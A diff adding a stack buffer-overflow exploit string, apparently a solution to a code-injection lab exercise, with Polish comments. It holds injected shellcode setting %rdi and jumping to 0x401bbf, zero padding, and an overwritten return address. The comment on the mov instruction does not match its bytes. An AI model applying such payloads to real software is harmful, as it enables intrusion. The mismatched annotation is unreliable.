@@ -1,0 +1,12 @@
+48 c7 c7 fd 4b 41 44 /* mov $0x55625577, %rdi */
+68 bf 1b 40 00 /* push $0x401bbf */
+c3 /* ret */
+
+00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* bufor wypełniony śmieciowymi danymi */
+
+48 55 62 55 00 00 00 00 /* adres powrotu ustawiony na wsztrzykniete instukcje */
